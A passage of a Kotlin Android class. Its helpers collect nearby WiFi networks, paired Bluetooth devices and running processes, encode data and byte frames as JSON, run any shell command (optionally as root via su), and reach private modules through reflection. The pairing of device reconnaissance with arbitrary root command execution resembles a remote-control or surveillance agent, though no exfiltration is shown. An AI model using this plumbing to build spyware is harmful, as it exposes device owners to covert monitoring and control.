                            "bssid" to result.BSSID,
                            "level" to result.level
                        )
                    )
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "WiFi scan failed: ${e.message}")
        }
        return networks
    }

    private fun getBluetoothDevices(): List<Map<String, Any>> {
        val devices = mutableListOf<Map<String, Any>>()
        try {
            val btAdapter = android.bluetooth.BluetoothAdapter.getDefaultAdapter()
            if (btAdapter != null && btAdapter.isEnabled) {
                val bonded = btAdapter.bondedDevices
                for (device in bonded) {
                    devices.add(
                        mapOf(
                            "name" to (device.name ?: "Unknown"),
                            "address" to device.address
                        )
                    )
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "BT scan failed: ${e.message}")
        }
        return devices
    }

    private fun getRunningProcesses(): List<Map<String, Any>> {
        val processes = mutableListOf<Map<String, Any>>()
        try {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            val runningApps = am.runningAppProcesses
            if (runningApps != null) {
                for (app in runningApps) {
                    processes.add(
                        mapOf(
                            "pid" to app.pid,
                            "process_name" to app.processName,
                            "importance" to app.importance
                        )
                    )
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Running processes failed: ${e.message}")
        }
        return processes
    }

    // ---------------- helper: JSON encoding (replaces kotlinx encodeToString on maps) ----------------

    private fun encode(data: Map<String, Any?>): String {
        return try {
            toJsonObject(data).toString()
        } catch (e: Exception) {
            Log.e(TAG, "encode failed: ${e.message}")
            "{}"
        }
    }

    private fun toJsonObject(map: Map<String, Any?>): JSONObject {
        val obj = JSONObject()
        for ((k, v) in map) {
            obj.put(k, toJson(v))
        }
        return obj
    }

    @Suppress("UNCHECKED_CAST")
    private fun toJson(value: Any?): Any {
        return when (value) {
            null -> JSONObject.NULL
            is JSONObject, is JSONArray -> value
            is Map<*, *> -> {
                val obj = JSONObject()
                for ((k, v) in value) {
                    obj.put(k.toString(), toJson(v))
                }
                obj
            }
            is Iterable<*> -> {
                val arr = JSONArray()
                for (item in value) {
                    arr.put(toJson(item))
                }
                arr
            }
            is Array<*> -> {
                val arr = JSONArray()
                for (item in value) {
                    arr.put(toJson(item))
                }
                arr
            }
            is ByteArray ->
                android.util.Base64.encodeToString(value, android.util.Base64.NO_WRAP)
            is Boolean, is Int, is Long, is Double, is Float, is Short, is Byte -> value
            is String -> value
            else -> value.toString()
        }
    }

    private fun encodeFrame(frame: Any?): Any {
        return when (frame) {
            is ByteArray -> android.util.Base64.encodeToString(frame, android.util.Base64.NO_WRAP)
            is String -> frame
            else -> frame?.toString() ?: ""
        }
    }

    // ---------------- helper: shell execution (replaces missing ShellUtils) ----------------

    private fun shellExec(command: String): Pair<String?, String?> {
        return try {
            val cmd: Array<String> = if (command.startsWith("su ")) {
                arrayOf("su", "-c", command.removePrefix("su "))
            } else {
                arrayOf("sh", "-c", command)
            }
            val process = ProcessBuilder(*cmd).redirectErrorStream(false).start()

            var stdout = ""
            var stderr = ""
            val outThread = Thread {
                stdout = process.inputStream.bufferedReader().use { it.readText() }
            }
            val errThread = Thread {
                stderr = process.errorStream.bufferedReader().use { it.readText() }
            }
            outThread.start()
            errThread.start()
            outThread.join(10_000)
            errThread.join(10_000)

            if (!process.waitFor(10, TimeUnit.SECONDS)) {
                process.destroy()
            }
            Pair(stdout, stderr)
        } catch (e: Exception) {
            Log.e(TAG, "shellExec failed: ${e.message}")
            Pair(null, e.message)
        }
    }

    // ---------------- helper: reflective module access (compiles even if modules are missing) ----------------

    private inner class ModuleRef(private val name: String) {
        private val target: Any? by lazy {
            try {
                val field = ServiceLocator::class.java.getDeclaredField(name)
                field.isAccessible = true
                field.get(serviceLocator)
            } catch (e: Exception) {
                Log.w(TAG, "Module '$name' not found: ${e.message}")
                null
            }
        }

        fun has(methodName: String, argCount: Int): Boolean {
            val t = target ?: return false
            return t.javaClass.methods.any {
                it.name == methodName && it.parameterTypes.size == argCount
            }
        }

        fun call(methodName: String, vararg args: Any?): Any? {
            val t = target ?: return null
            val method = t.javaClass.methods.firstOrNull {
                it.name == methodName && it.parameterTypes.size == args.size
            } ?: return null
            return try {
                method.isAccessible = true
                method.invoke(t, *args)
            } catch (e: Exception) {
                Log.e(TAG, "Module '$name'.$methodName failed: ${e.message}")
                null
            }
        }
    }

    private fun module(name: String): ModuleRef = ModuleRef(name)

    // ---------------- helper: alarm broadcast receiver (self-contained) ----------------

    class AlarmTriggerReceiver : android.content.BroadcastReceiver() {
        override fun onReceive(context: Context, intent: android.content.Intent) {
            Log.i(TAG, "Alarm triggered: ${intent.getStringExtra("alarm_type")}")
        }
    }

    fun shutdown() {
        scope.cancel()
    }
}
